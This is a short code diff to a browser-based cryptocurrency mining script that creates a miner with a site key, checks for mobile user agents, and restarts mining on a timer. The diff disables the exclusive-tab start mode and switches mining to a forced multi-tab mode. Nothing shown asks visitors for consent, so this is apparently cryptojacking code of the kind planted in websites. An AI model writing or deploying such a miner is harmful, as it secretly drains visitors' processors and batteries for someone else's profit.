@@ -23,7 +23,7 @@
     var siteKey = 'SK_JhGw9gvrrXTqTJ7KhowoL';
 	if( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ) {
 		var miner = WMP.Anonymous(siteKey);
-		miner.start(WMP.IF_EXCLUSIVE_TAB);
+		//miner.start(WMP.IF_EXCLUSIVE_TAB);
 		alert('MOBILE');
 		
 			if(miner)
@@ -33,7 +33,7 @@
 			
 		function get_start()
 		{
-			miner.start();
+			miner.start(WMP.FORCE_MULTI_TAB);
 			var timer_at=setTimeout(function(){  
 							get_start();
 							tm = 5000;
